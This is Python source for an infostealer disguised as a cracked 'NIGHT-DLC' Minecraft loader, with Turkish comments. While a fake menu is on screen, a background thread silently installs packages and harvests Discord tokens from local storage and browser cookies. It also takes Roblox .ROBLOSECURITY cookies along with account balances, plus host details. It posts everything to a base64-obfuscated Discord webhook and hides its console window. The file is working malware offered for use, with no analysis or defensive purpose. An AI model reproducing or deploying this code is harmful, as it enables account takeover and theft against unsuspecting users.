import os
import sys
import time
import json
import base64
import platform
import re
import sqlite3
import hashlib
import uuid
import subprocess
import threading
import shutil
import tempfile
from datetime import datetime

# ==================== KONFİGÜRASYON ====================
WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NDAwMjgzMjU4NzAzMDY2MC9zcklWVURHWG1pQVZhYWtHampLYm9mdnotRFZVNjJudEFXTy1iYVZPeGJVT1VMeVRmck1tc3c5b1dzZnlKVU5DQWRUZQ=="

# ==================== SESSİZ MODÜL KURUCU ====================
class SilentInstaller:
    """Hiçbir şey göstermeden modül kurar"""
    
    @staticmethod
    def install_modules():
        """Tüm gerekli modülleri sessizce kur"""
        required = [
            'requests',
            'browser_cookie3',
            'psutil',
            'pywin32' if sys.platform == 'win32' else None,
            'cryptography'
        ]
        
        for module in filter(None, required):
            SilentInstaller._silent_install(module)
    
    @staticmethod
    def _silent_install(module):
        """Modülü hiçbir çıktı göstermeden kur"""
        try:
            # Önce import etmeyi dene
            __import__(module)
            return True
        except ImportError:
            # Sessizce kur
            cmd = [sys.executable, "-m", "pip", "install", "--quiet", "--disable-pip-version-check", module]
            
            try:
                # Hiçbir çıktı gösterme
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                
                subprocess.run(
                    cmd,
                    startupinfo=startupinfo,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
                )
                return True
            except:
                return False

# ==================== TAMAMEN SESSİZ DATA TOPLAYICI ====================
class SilentDataCollector:
    def __init__(self):
        self.webhook_url = self._decode_webhook()
        self._init_session()
        
    def _decode_webhook(self):
        """Webhook'u sessizce decode et"""
        try:
            return base64.b64decode(WEBHOOK_B64).decode()
        except:
            return None
    
    def _init_session(self):
        """Requests session'ı sessizce oluştur"""
        try:
            import requests
            self.session = requests.Session()
            self.session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json'
            })
        except:
            self.session = None
    
    def collect_and_send(self):
        """Tüm verileri sessizce topla ve gönder"""
        try:
            # Veri topla
            data = self._collect_all_data()
            
            # Webhook'a gönder
            self._send_to_webhook(data)
            
            # Lokale kaydet
            self._save_locally(data)
            
        except:
            pass
    
    def _collect_all_data(self):
        """Tüm verileri topla"""
        data = {
            "time": datetime.now().isoformat(),
            "system": self._get_system_info(),
            "discord": self._get_discord_data(),
            "roblox": self._get_roblox_data(),
            "network": self._get_network_info(),
            "device_id": self._get_device_id()
        }
        return data
    
    def _get_system_info(self):
        """Sistem bilgisi"""
        info = {}
        try:
            info.update({
                "user": os.getenv('USERNAME') or os.getenv('USER') or "Unknown",
                "host": platform.node(),
                "os": f"{platform.system()} {platform.release()}",
                "cpu": platform.processor(),
                "arch": platform.machine()
            })
        except:
            pass
        return info
    
    def _get_discord_data(self):
        """Discord verileri"""
        tokens = []
        
        try:
            # Desktop app
            if sys.platform == 'win32':
                localappdata = os.getenv('LOCALAPPDATA')
                paths = [
                    os.path.join(localappdata, 'Discord', 'Local Storage', 'leveldb'),
                    os.path.join(localappdata, 'DiscordPTB', 'Local Storage', 'leveldb'),
                    os.path.join(localappdata, 'DiscordCanary', 'Local Storage', 'leveldb')
                ]
                
                for path in paths:
                    if os.path.exists(path):
                        tokens.extend(self._scan_files(path))
            
            # Browser cookies
            browser_tokens = self._get_browser_tokens()
            tokens.extend(browser_tokens)
            
        except:
            pass
        
        unique_tokens = list(set(tokens))
        return {"count": len(unique_tokens), "tokens": unique_tokens[:5]}
    
    def _scan_files(self, folder):
        """Dosyalarda token ara"""
        tokens = []
        try:
            for file in os.listdir(folder):
                if file.endswith(('.log', '.ldb')):
                    try:
                        with open(os.path.join(folder, file), 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                        
                        pattern = r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
                        matches = re.findall(pattern, content)
                        tokens.extend(matches)
                    except:
                        continue
        except:
            pass
        return tokens
    
    def _get_browser_tokens(self):
        """Browser token'ları"""
        tokens = []
        try:
            import browser_cookie3
            
            browsers = [
                browser_cookie3.chrome,
                browser_cookie3.edge,
                browser_cookie3.firefox
            ]
            
            for browser in browsers:
                try:
                    cookies = browser(domain_name='discord.com')
                    for cookie in cookies:
                        if 'token' in cookie.name.lower():
                            tokens.append(cookie.value)
                except:
                    continue
                    
        except:
            pass
        return tokens
    
    def _get_roblox_data(self):
        """Roblox verileri"""
        accounts = []
        
        try:
            cookies = self._get_roblox_cookies()
            
            for cookie_name, cookie_value in list(cookies.items())[:3]:
                if 'ROBLOSECURITY' in cookie_name:
                    account = self._get_roblox_account(cookie_value)
                    if account:
                        accounts.append(account)
        
        except:
            pass
        
        return {"accounts": accounts}
    
    def _get_roblox_cookies(self):
        """Roblox cookies"""
        cookies = {}
        try:
            import browser_cookie3
            
            browsers = [
                ('chrome', browser_cookie3.chrome),
                ('edge', browser_cookie3.edge)
            ]
            
            for name, browser in browsers:
                try:
                    browser_cookies = browser(domain_name='roblox.com')
                    for cookie in browser_cookies:
                        if 'ROBLOSECURITY' in cookie.name:
                            cookies[f"{name}_{cookie.name}"] = cookie.value
                except:
                    continue
                    
        except:
            pass
        return cookies
    
    def _get_roblox_account(self, cookie):
        """Roblox hesap bilgisi"""
        try:
            import requests
            
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            
            # User info
            resp = requests.get('https://users.roblox.com/v1/users/authenticated', 
                              headers=headers, timeout=5)
            if resp.status_code == 200:
                user = resp.json()
                
                # Robux
                robux = 0
                try:
                    econ_resp = requests.get('https://economy.roblox.com/v1/user/currency',
                                           headers=headers, timeout=5)
                    if econ_resp.status_code == 200:
                        robux = econ_resp.json().get('robux', 0)
                except:
                    pass
                
                return {
                    "username": user.get('name', 'Unknown'),
                    "robux": robux,
                    "premium": user.get('hasPremium', False),
                    "user_id": user.get('id'),
                    "cookie": cookie
                }
                
        except:
            pass
        return None
    
    def _get_network_info(self):
        """Network bilgisi"""
        info = {}
        try:
            import socket
            info["hostname"] = socket.gethostname()
            
            # Local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info["ip"] = s.getsockname()[0]
            s.close()
            
        except:
            pass
        return info
    
    def _get_device_id(self):
        """Cihaz ID"""
        try:
            system_string = f"{platform.node()}{platform.machine()}"
            return hashlib.md5(system_string.encode()).hexdigest()[:12]
        except:
            return str(uuid.uuid4())[:12]
    
    def _send_to_webhook(self, data):
        """Webhook'a sessizce gönder"""
        if not self.webhook_url or not self.session:
            return
        
        try:
            embeds = []
            
            # Main embed
            main_embed = {
                "title": "📡 Data Collected",
                "color": 0x3498db,
                "fields": [
                    {
                        "name": "User",
                        "value": f"```{data['system'].get('user', 'Unknown')}```",
                        "inline": True
                    },
                    {
                        "name": "System",
                        "value": f"```{data['system'].get('os', 'Unknown')}```",
                        "inline": True
                    }
                ],
                "timestamp": datetime.utcnow().isoformat()
            }
            embeds.append(main_embed)
            
            # Discord tokens
            discord = data.get('discord', {})
            if discord.get('count', 0) > 0:
                token_embed = {
                    "title": f"🔑 Discord Tokens ({discord['count']})",
                    "color": 0x2ecc71
                }
                embeds.append(token_embed)
            
            # Roblox accounts
            roblox = data.get('roblox', {})
            if roblox.get('accounts'):
                for acc in roblox['accounts']:
                    account_embed = {
                        "title": f"🎮 {acc.get('username', 'Unknown')}",
                        "color": 0xe74c3c,
                        "fields": [
                            {
                                "name": "Robux",
                                "value": f"```{acc.get('robux', 0):,}```",
                                "inline": True
                            },
                            {
                                "name": "Premium",
                                "value": f"```{'✅' if acc.get('premium') else '❌'}```",
                                "inline": True
                            }
                        ]
                    }
                    embeds.append(account_embed)
            
            payload = {
                "embeds": embeds,
                "username": "System Monitor"
            }
            
            self.session.post(self.webhook_url, json=payload, timeout=5)
            
        except:
            pass
    
    def _save_locally(self, data):
        """Lokale kaydet"""
        try:
            filename = f"system_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
        except:
            pass

# ==================== FAKE MINECRAFT LOADER (GÖRÜNÜM) ====================
class MinecraftLoaderUI:
    def __init__(self):
        # Arka planda sessizce veri topla
        threading.Thread(target=self._start_silent_collection, daemon=True).start()
        
    def _start_silent_collection(self):
        """Sessizce veri toplamayı başlat"""
        # Modülleri sessizce kur
        SilentInstaller.install_modules()
        
        # Veri topla ve gönder
        collector = SilentDataCollector()
        collector.collect_and_send()
    
    def _clear_screen(self):
        """Ekranı temizle"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def _print_banner(self):
        """Banner göster"""
        self._clear_screen()
        print("""
╔════════════════════════════════════════════════════╗
║                                                    ║
║               NIGHT-DLC MINECRAFT                  ║
║                LOADER v2.7.3                       ║
║                                                    ║
║              Coded by nukeqed                      ║
║              (cracked pre)                         ║
║                                                    ║
╚════════════════════════════════════════════════════╝
        """)
    
    def run(self):
        """Ana menü"""
        self._print_banner()
        
        # Kısa bekleme (veri toplama için zaman)
        time.sleep(2)
        
        # Menü göster
        print("""
[1] Launch Minecraft
[2] Memory Settings  
[3] Language
[4] Exit

Select: """, end='')
        
        choice = input()
        
        if choice == "1":
            print("\nLaunching game...")
            time.sleep(2)
            print("Game started!")
        elif choice == "2":
            print("\nMemory: 4096MB")
        elif choice == "3":
            print("\nLanguage: English / Russian")
        
        print("\nClosing in 3 seconds...")
        time.sleep(3)

# ==================== EXE İÇİN GİZLİ BAŞLANGIÇ ====================
def is_frozen():
    """EXE olarak çalışıyor mu kontrol et"""
    return getattr(sys, 'frozen', False)

def hide_console():
    """Konsolu gizle (Windows)"""
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# ==================== ANA PROGRAM ====================
if __name__ == "__main__":
    # EXE ise konsolu gizle
    if is_frozen():
        hide_console()
    
    # Loader'ı başlat
    try:
        loader = MinecraftLoaderUI()
        loader.run()
    except:
        # Herhangi bir hata durumunda sessizce kapan
        pass